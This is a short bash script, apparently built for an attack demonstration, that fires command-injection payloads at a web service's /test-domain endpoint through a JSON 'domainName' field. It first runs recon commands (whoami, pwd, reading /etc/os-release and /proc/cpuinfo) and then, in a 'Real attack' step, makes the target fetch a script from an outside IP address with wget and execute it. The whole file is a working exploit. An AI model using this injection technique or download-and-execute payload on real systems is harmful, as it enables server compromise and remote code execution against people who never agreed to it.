#!/bin/bash
set -e

if [[ $# -ne 1 ]]; then
  echo "Usage: run-attack.sh alb-url"
  exit 1
fi

function request() {
  curl -s $url/test-domain -H "Content-Type: application/json" -X POST -d "{\"domainName\":\"$1\"}"
  echo
}
function run() {
  cmd=$1
  request "google.com && $cmd"
}
function randomSleep() {
  sleep $((RANDOM % 4))
}

url=$1

# Recon
echo "Performing recon"
request "google.com"
randomSleep

request "aaaaa"
randomSleep

request '$(whoami)'
randomSleep

request '\`whoami\`'
randomSleep

run "whoami"
randomSleep

run "pwd"
randomSleep

run "cat /etc/os-release"
randomSleep

run "cat /proc/cpuinfo"

# Real attack
sleep 5
echo "Attacking"
run "/usr/bin/wget 143.198.125.69/a.sh -O /tmp/a && chmod +x /tmp/a && sh /tmp/a"